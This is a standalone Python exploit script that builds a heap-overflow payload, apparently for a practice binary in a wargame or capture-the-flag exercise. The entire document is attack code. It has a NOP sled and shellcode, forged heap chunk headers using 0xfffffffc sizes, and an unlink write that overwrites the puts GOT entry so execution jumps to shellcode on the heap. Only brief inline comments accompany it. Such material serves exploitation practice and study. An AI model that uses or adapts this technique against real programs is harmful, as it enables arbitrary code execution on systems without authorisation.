#!/usr/bin/env python3
import struct
import sys
from pwnpy.pwn import *

shellcode = b'\xb8\x64\x88\x04\x08\xff\xd0\xff'
jmp_to_shellcode = b'\xeb\x0c'
heap = 0x804c000
shellcode_ptr = struct.pack('I', heap+0xc)


win = struct.pack('I', 0x8048494)
puts = 0x804b128
safe_pointer = struct.pack('I', 0xfffffffc)


buf = b''

#First argument
buf += b'\x90'*18
buf += shellcode

#Separator
buf += b' '

#Second argument
buf += create_pattern(0x8)
buf += safe_pointer
buf += b'\x65' # We have to create a chunk greater than 80 bytes for the unlink

#Separator
buf += b' '

#Third argument
buf += b'A'*(0x64-0x8) # -0x8 for the added metadata pointers (prev_size & size)
buf += safe_pointer
buf += safe_pointer
buf += struct.pack('I', puts-0xc)
buf += shellcode_ptr

buf += b'\n'

sys.stdout.buffer.write(buf)
sys.stdout.flush()
